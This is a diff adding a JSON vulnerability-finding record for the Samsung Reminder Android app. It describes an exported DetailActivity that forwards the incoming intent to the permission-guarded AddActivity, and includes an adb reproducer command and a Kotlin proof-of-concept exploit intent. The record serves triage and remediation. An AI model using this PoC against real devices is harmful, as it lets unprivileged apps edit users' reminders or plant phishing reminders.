@@ -1,0 +1,74 @@
+{
+  "_comment": "Samsung Reminder deeplink 추적 결과(sample/tracking.result V-001)를 raw-report 포맷으로 wrapping. scripts/upload-report.mjs로 정규화해 findings/FND-2026-04-29-A03.json 생성.",
+
+  "report_id": "RPT-2026-04-29-SR",
+  "project": "samsung-reminder",
+  "scanner": "deeplink-tracker-v0.1",
+  "scanner_version_sha": "sample",
+  "scan_id": "scan-2026-04-29-sr-001",
+  "started_at": "2026-04-29T08:30:00Z",
+  "completed_at": "2026-04-29T09:00:00Z",
+  "duration_seconds": 1800,
+  "target_root": "com.samsung.android.app.reminder",
+  "scan_profile": "deeplink-static-analysis",
+
+  "uploader": {
+    "github": "lkh8291",
+    "uploaded_at": "2026-04-29T09:05:00Z",
+    "curation_pass_count": 1
+  },
+
+  "human_curation_notes": "tracking.result V-001~V-020 중 가장 근간이 되는 V-001 (DetailActivity Confused Deputy)만 sample finding으로 등록. 나머지 19건은 후속 batch에서 분리 처리 예정.",
+
+  "raw_findings": [
+    {
+      "raw_idx": 2,
+      "domain": "android",
+      "type": "exposed-component-confused-deputy",
+      "severity_estimate": "high",
+      "title": "DetailActivity Permission-Bypass via Intent Redirection to AddActivity",
+      "discovered_at": "2026-04-29T09:00:00Z",
+
+      "target": {
+        "package": "com.samsung.android.app.reminder",
+        "version_name": "unknown",
+        "build_type": "release",
+        "component_type": "activity",
+        "component_class": "com.samsung.android.app.reminder.ui.detail.view.DetailActivity",
+        "exported": true,
+        "permission_required": null,
+        "intent_filter": {
+          "actions": ["android.intent.action.VIEW", "com.samsung.android.app.reminder.action.ReminderDetailView"],
+          "categories": ["android.intent.category.DEFAULT"],
+          "data_schemes": ["uuid", "reminder", "content"],
+          "data_hosts": ["reminder.uuid", "viewdetail", "@string/string_detail_view_host_name"]
+        },
+        "deeplink_example": "uuid://reminder.uuid/11111111-2222-3333-4444-555555555555"
+      },
+
+      "evidence": {
+        "manifest_excerpt": "<activity\n    android:name=\"com.samsung.android.app.reminder.ui.detail.view.DetailActivity\"\n    android:exported=\"true\">\n  <intent-filter>\n    <action android:name=\"android.intent.action.VIEW\"/>\n    <category android:name=\"android.intent.category.DEFAULT\"/>\n    <data android:scheme=\"uuid\" android:host=\"reminder.uuid\"/>\n  </intent-filter>\n  <intent-filter>\n    <action android:name=\"com.samsung.android.app.reminder.action.ReminderDetailView\"/>\n    <category android:name=\"android.intent.category.DEFAULT\"/>\n    <data android:scheme=\"reminder\" android:host=\"viewdetail\"/>\n  </intent-filter>\n  <intent-filter>\n    <action android:name=\"android.intent.action.VIEW\"/>\n    <category android:name=\"android.intent.category.DEFAULT\"/>\n    <data android:scheme=\"content\" android:host=\"@string/string_detail_view_host_name\"/>\n  </intent-filter>\n</activity>\n\n<activity\n    android:name=\"com.samsung.android.app.reminder.ui.detail.add.AddActivity\"\n    android:permission=\"com.samsung.android.app.reminder.permission.action.REGISTER\"\n    android:exported=\"true\"/>",
+
+        "code_excerpt": "// DetailActivity.java (decompiled, lines 43-107)\nString stringExtra = getIntent().getStringExtra(\"uuid\");\nif (stringExtra == null && getIntent().getData() != null) {\n    stringExtra = getIntent().getData().getLastPathSegment();\n    if (stringExtra == null) {\n        stringExtra = getIntent().getData().getQueryParameter(\"uuid\");\n    }\n}\n\nIntent intent = getIntent();\nintent.setClass(getApplicationContext(), AddActivity.class);\nintent.putExtra(\"add_view_type\", ...);\nintent.putExtra(\"uuid\", stringExtra);\nintent.putExtra(\"viewDetailFromCalendar\", booleanExtra);\nintent.putExtra(\"viewDetailFromNowBrief\", booleanExtra2);\n\nif (zD || zD2) {\n    setIntent(y0.a(getApplicationContext(), getIntent()));\n    getApplicationContext().startActivity(getIntent());\n} else {\n    y0.k(this, intent);\n}",
+
+        "intent_reproducer": "adb shell am start -W -a android.intent.action.VIEW \\\n  -d 'uuid://reminder.uuid/11111111-2222-3333-4444-555555555555' \\\n  -n com.samsung.android.app.reminder/com.samsung.android.app.reminder.ui.detail.view.DetailActivity \\\n  --ei add_view_type 2 \\\n  --es uuid 11111111-2222-3333-4444-555555555555",
+
+        "poc_kotlin": "val victimUuid = \"11111111-2222-3333-4444-555555555555\"\nval exploit = Intent(Intent.ACTION_VIEW).apply {\n    setClassName(\n        \"com.samsung.android.app.reminder\",\n        \"com.samsung.android.app.reminder.ui.detail.view.DetailActivity\"\n    )\n    data = Uri.parse(\"uuid://reminder.uuid/$victimUuid\")\n    putExtra(\"uuid\", victimUuid)\n    putExtra(\"add_view_type\", 2)\n    putExtra(\"viewDetailFromCalendar\", true)\n    addFlags(\n        Intent.FLAG_ACTIVITY_NEW_TASK or\n        Intent.FLAG_GRANT_READ_URI_PERMISSION or\n        Intent.FLAG_GRANT_WRITE_URI_PERMISSION\n    )\n}\nstartActivity(exploit)"
+      },
+
+      "ai_confidence": 0.9,
+      "ai_notes": "DetailActivity는 android:exported=true이고 permission 미지정 상태로 세 종류의 deeplink intent-filter (uuid://, reminder://viewdetail, content://...)에 노출됨. onCreate에서 getIntent()를 그대로 보존한 채 setClass(ctx, AddActivity.class)로 컴포넌트만 갈아끼우고 startActivity를 호출하기 때문에 AddActivity의 android:permission=\"...REGISTER\" 가드가 우회됨 (classic confused-deputy / permission re-delegation). 공격자 제어 extras (add_view_type, uuid, viewDetailFromCalendar, FLAG_GRANT_READ/WRITE_URI_PERMISSION, ClipData)가 모두 보존되어 다운스트림 sink (V-006 scan-reminder, V-009 pending_data parseUri, V-010 Serializable, V-011 self-embed)로 흘러들어감. 권한 없는 3rd-party 앱이 임의 reminder를 EDIT 모드로 띄우거나 phishing reminder를 생성 가능.",
+
+      "cwe": "CWE-441",
+      "cve": null,
+      "mstg_reference": "MSTG-PLATFORM-3",
+      "remediation_hint": "1) DetailActivity에서 getIntent() mutate 대신 새 Intent를 만들어 화이트리스트 extras만 복사. 2) FLAG_GRANT_*, FLAG_ACTIVITY_* strip. 3) DetailActivity 자체에 REGISTER permission 부여 또는 호출자 UID 기반 ownership 검증.",
+
+      "curation_decision": "accepted → FND-2026-04-29-A03"
+    }
+  ],
+
+  "sibling_finding_ids": [
+    "FND-2026-04-29-A03"
+  ]
+}
